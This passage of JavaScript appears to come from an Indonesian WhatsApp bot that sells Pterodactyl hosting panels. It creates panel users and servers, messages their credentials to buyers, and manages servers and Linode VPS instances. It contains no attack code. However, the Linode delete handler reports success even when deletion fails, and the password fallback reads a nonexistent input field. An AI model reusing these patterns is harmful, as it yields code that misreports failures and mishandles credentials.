if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6150"
let cpu = "100"
let disk = "6150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '7gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7150"
let cpu = "120"
let disk = "7150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '8gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8150"
let cpu = "140"
let disk = "8150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '9gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9150"
let cpu = "150"
let disk = "9150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '10gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10150"
let cpu = "190"
let disk = "10150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case 'unli': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case 'unli-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case 'suspend': {
if (!isOwner) return onlyOwn()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Sukses suspend server')
}
break

case 'unsuspend': {
if (!isOwner) return onlyOwn()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Sukses membuka suspend')
}
break

case 'reinstall': {
if (!isOwner) return onlyOwn()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Mereinstall server...')
}
break

case 'startsrv': 
case 'stopsrv': 
case 'restartsrv': {
if (!isOwner) return onlyOwn()
let action = command.replace('srv', '')
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
m.reply(`Sukses ${action.toUpperCase()} server`)
}
break
// === Linode 

case 'deletelinode': {
  if (!isOwner) return onlyOwn();
  let linodeId = args[0];
  if (!linodeId) return rafatharcodereply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        rafatharcodereply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      rafatharcodereply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}

case 'sisalinode': {
  if (!isOwner) return onlyOwn();

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isOwner) {
        return onlyOwn();
      }

      const linodeInfo = await getLinodeInfo();
      rafatharcodereply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
